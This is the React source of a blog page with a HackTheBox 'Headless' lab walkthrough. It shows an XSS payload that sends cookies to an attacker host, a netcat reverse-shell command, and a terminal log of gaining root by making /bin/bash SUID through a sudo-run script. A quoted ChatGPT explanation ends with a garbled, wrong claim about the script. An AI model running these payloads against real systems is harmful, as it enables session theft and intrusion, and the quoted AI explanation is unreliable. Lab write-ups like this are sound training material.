'use client';
import { Divider } from "@nextui-org/react";
import HeaderBlog from "@/components/blog/HeaderBlog";
import TableContent from "@/components/blog/TableContent";
import SubHeader from "@/components/blog/SubHeader";
import SubPara from "@/components/blog/SubPara";
import { Code } from "@nextui-org/react";
import SubImage from "@/components/blog/SubImage";
import { Link } from "@nextui-org/react";
import FooterBlog from '@/components/blog/Footer'
import { list_post } from "@/config/post";
import hljs from "highlight.js";
import 'highlight.js/styles/atom-one-dark.css';
import { useEffect } from "react";
export default function Page() {
    
    hljs.registerLanguage('bash', require('highlight.js/lib/languages/bash'));

    useEffect(() => {
        hljs.initHighlighting();
    }, []);
    const findDate = (header: string) => {
        // Check if list_post array exists and has items
        if (list_post && list_post.length > 0) {
            // Iterate through the array
            for (let i = 0; i < list_post.length; i++) {
                const post = list_post[i];
                // Check if the post object has the header property
                if (post && post.header === header) {
                    // Return the header value
                    return post.date;
                }
            }
            // If no header found in any post
            return "Header not found";
        } else {
            // If list_post array is empty or undefined
            return "No posts found";
        }
    };

    const date = findDate('Headless');
    const items = [
        {
            key: 'Introduction',
            label: 'Introduction',
            idx: '#introduction'
        },
        {
            key: 'Enumeration',
            label: 'Enumeration',
            idx: '#enumeration'
        },
        {
            key: 'Exploitation',
            label: 'Exploitation',
            idx: '#exploitation'
        },
        {
            key: 'PrivilegeEscalation',
            label: 'Privilege Escalation',
            idx: '#privilegeescalation'
        }
    ];
    return (
        <div className="mt-3 w-[90%] md:w-4/5 mx-auto">
            <HeaderBlog name="Headless" />
            <Divider />
            <TableContent items={items} />
            <div id="introduction" className="my-2">
                <SubHeader item={{ num: '1', content: 'Introduction' }} />
                <SubPara content={'This challenge is from HackTheBox and is rated as easy difficulty. This challenge involves identifying vulnerabilities in XSS attack and setup bad shellcode in linux system.'} />
            </div>
            <div id="enumeration" className="my-2">
                <SubHeader item={{ num: '2', content: 'Enumeration' }} />
                <SubPara content='Using nmap tool' />
                <SubImage img={{
                    alt: 'Nmap tool image',
                    path: '/images/headless/img1.png',
                    size: 500
                }} />
                <div className="overflow-x-auto">
                    <Code color="success" className="my-3">{`Dir seach -> /dashboard  and /support`}</Code>
                </div>
                <SubPara content='Navigate to /support. Upon visiting this page, if you inject a malicious payload such as <script>alert(1)</script>, it triggers a table titled "Hacking Attempt Detection." As illustrated in the image below, this table displays the rendered content in the header to notify users and detects the User-Agent. By exploiting this vulnerability, you can display this table and manipulate the User-Agent to precisely obtain the admin&apos;s cookie. This type attack is XXS attack.' />
                <SubImage img={{
                    alt: 'Hacking Attempt Detection',
                    path: '/images/headless/img2.png',
                    size: 700
                }} />
            </div>
            <div id="exploitation" className="my-2">
                <SubHeader item={{ num: '3', content: 'Exploitation' }} />
                <div className="overflow-x-auto">
                    <Code color="success" className="my-3">{`The User-Agent in this image is displaying an error because I injected a malicious payload.`}</Code>
                </div>
                <SubImage img={{
                    alt: 'Hacking Attempt Detection',
                    path: '/images/headless/img3.png',
                    size: 700
                }} />
                <div className="overflow-x-auto">
                    <Code color="warning" className="my-3">{`I am utilizing BurpSuite to intercept payloads. In this image, it shows the repeater mode in action.`}</Code>
                </div>
                <div className="overflow-x-auto">
                    <Code color="success" className="my-3">{`payload: <img src=x onerror=fetch('http://<attackHost>'+btoa(document.cookie))>`}</Code>
                </div>
                <SubImage img={{
                    alt: 'BurpSuite send payload',
                    path: '/images/headless/img4.png',
                    size: 700
                }} />

                <SubImage img={{
                    alt: 'Hacking Attempt Detection',
                    path: '/images/headless/img5.png',
                    size: 700
                }} />
                <SubPara content={`Edit the cookie by pressing F12 to access the developer tools, then navigate to the Storage tab and make the necessary alterations. Alternatively, you can utilize the CookieEditor extension for this task. After that, refesh dashboard page!`} />
                <SubImage img={{
                    alt: 'Alter cookie',
                    path: '/images/headless/img6.png',
                    size: 700
                }} />
                <SubImage img={{
                    alt: 'Result admin page',
                    path: '/images/headless/img7.png',
                    size: 700
                }} />
                <SubPara content={`Once again, utilize BurpSuite to intercept the payload when pressing "gen-date" in the dashboard. You will observe the page rendering the full output, indicating a successful return from the target system.`} />
                <SubImage img={{
                    alt: 'Intercept Gen date',
                    path: '/images/headless/img8.png',
                    size: 700
                }} />
                <SubImage img={{
                    alt: 'Find user flag',
                    path: '/images/headless/img9.png',
                    size: 700
                }} />
                <SubImage img={{
                    alt: 'Done User FLag',
                    path: '/images/headless/img10.png',
                    size: 700
                }} />
                <div className="overflow-x-auto">
                    <Code color="warning" className="my-3">Congratulations on obtaining the user flag! Well done!</Code>
                </div>
                <div id="privilegeescalation" className="my-2">
                    <SubHeader item={{ num: '4', content: 'Privilege Escalation' }} />
                    <SubPara content={`Begin by creating a reverse shell using the netcat command.`} />
                    <div className="overflow-x-auto">
                        <Code color="success" className="my-3">{`attack machine: nc -lnvp 4444`}</Code>
                    </div><div className="overflow-x-auto">
                        <Code color="success" className="my-3">{`payload send from burpsuite: nc -e /bin/bash <hostip> 4444`}</Code>
                    </div>
                    <SubImage img={{
                        alt: 'Create a rev shell',
                        path: '/images/headless/img11.png',
                        size: 700
                    }} />
                    <pre className="overflow-auto my-4 border-1 rounded-[2rem] p-1"><code className="bash">
                        {`──(toan㉿ToanNguyen)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.8] 37370
python3 --version
Python 3.11.2
python3 -c 'import pty; pty.spawn("/bin/bash");'
dvir@headless:~/app$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                       
┌──(toan㉿ToanNguyen)-[~]
└─$ stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
[1]  + continued  nc -lnvp 4444

dvir@headless:~/app$ whoami
dvir
dvir@headless:~/app$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
dvir@headless:~/app$ cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  GNU nano 7.2                        initdb.sh                                 
#!/bin/bash
/bin/bash -i


dvir@headless:~/app$ chmod +x initdb.sh 
dvir@headless:~/app$ /usr/
bin/     include/ lib64/   local/   share/   
games/   lib/     libexec/ sbin/    src/     
dvir@headless:~/app$ /usr/bin/syscheck
dvir@headless:~/app$ id
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
dvir@headless:~/app$ clear
TERM environment variable not set.
dvir@headless:~/app$ clear
TERM environment variable not set.
dvir@headless:~/app$ cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
dvir@headless:~/app$ mv initdb.sh /bin/bash
mv: replace '/bin/bash', overriding mode 0755 (rwxr-xr-x)? n
dvir@headless:~/app$ ls
app.py          hackattempt.html  index.html  inspect_reports.py  support.html
dashboard.html  hacking_reports   initdb.sh   report.sh
dvir@headless:~/app$ mv initdb.sh /bin
mv: cannot move 'initdb.sh' to '/bin/initdb.sh': Permission denied
dvir@headless:~/app$ rm in 
index.html          initdb.sh           inspect_reports.py
dvir@headless:~/app$ rm initdb.sh 
dvir@headless:~/app$ echo "chmod x+s /bin/bash" > initdb.sh
dvir@headless:~/app$ chmod +x initdb.sh 
dvir@headless:~/app$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.1G
System load average:  0.00, 0.01, 0.00
Database service is not running. Starting it...
dvir@headless:~/app$ ./initdb.sh 
chmod: invalid mode: ‘x+s’
Try 'chmod --help' for more information.
dvir@headless:~/app$ echo "chmod u+s /bin/bash" > initdb.sh
dvir@headless:~/app$ sudo /usr/bin/syscheck                
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.1G
System load average:  0.00, 0.00, 0.00
Database service is not running. Starting it...
dvir@headless:~/app$ ./initdb.sh 
chmod: changing permissions of '/bin/bash': Operation not permitted
dvir@headless:~/app$ /bin/bash -p
bash-5.2# id
uid=1000(dvir) gid=1000(dvir) euid=0(root) groups=1000(dvir),100(users)
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root
cat: root: No such file or directory
bash-5.2# cat root.txt 
dc6ca281<hihihihihihihihahahahaha>1a2a2
bash-5.2# 
`}
                    </code>
                    </pre>
                    <SubPara content={`When checking sudo permissions, you can observe that you have the ability to run sudo with all permissions using /usr/bin/syscheck. read this file and analyze its contents. This it anwser when i ask chatgpt.`} />
                    <pre className="overflow-auto my-4 border-1 rounded-[2rem] p-1"><code>
                        {`This script appears to be a Bash script (denoted by the shebang \`#!/bin/bash\` at the beginning), designed to perform various system checks and operations. Let's break down each part:

1. **Check Root Privileges**: 
   - The script checks if it's being run with root privileges (\`$EUID\` holds the effective user ID). If not (\`-ne\` means "not equal"), it exits with a status of 1, indicating an error.

2. **Find Last Modified Kernel**:
   - It searches for the last modified kernel file in the \`/boot\` directory.
   - The \`find\` command with \`stat\` is used to get the modification time of files starting with 'vmlinuz' in \`/boot\`.
   - The output is sorted, and the last line (with the latest modification time) is selected.
   - The timestamp is then formatted using \`date\` to display the date and time of the last modification of the kernel.

3. **Check Disk Space**:
   - It uses \`df\` to check the disk space of the root filesystem (\`/\`).
   - The output is parsed with \`awk\` to extract the available disk space.

4. **Check System Load Average**:
   - The \`uptime\` command is used to get the system load average.
   - \`awk\` is used to extract the load average from the output.

5. **Check and Start Database Service**:
   - It checks if a process named "initdb.sh" is running (\`pgrep\` command).
   - If it's not running, it prints a message and attempts to start the database service by executing \`./initdb.sh\`.
   - If the process is already running, it prints a message indicating that the database service is already running.

6. **Exit Status**:
   - Finally, the script exits with a status of 0, indicating successful execution.

Overall, this script is meant to provide system information such as kernel modification time, available disk space, system load average, and to ensure the database service is running, starting it if necessary. However, there is a line \`exit 0\` at the end of the script which makes the script exit without executing the block of code after it. This means the last line \`what mean in this code\` is unreachable and will never be executed.`}
                    </code></pre>
                    <SubPara content={`Create an initdb.sh script with content to set the user and sticky permissions for it. Run syscheck -> run bash -> get flag.`} />
                </div>
                <SubImage img={{
                    alt: 'Done',
                    path: '/images/headless/result.png',
                    size: 500
                }} />
                <div className="overflow-x-auto">
                    <Code color="warning" className="my-3">Congratulations on obtaining the Root flag! Well done!</Code>
                </div>
            </div>
            <FooterBlog date={date} />
        </div>
    );
}
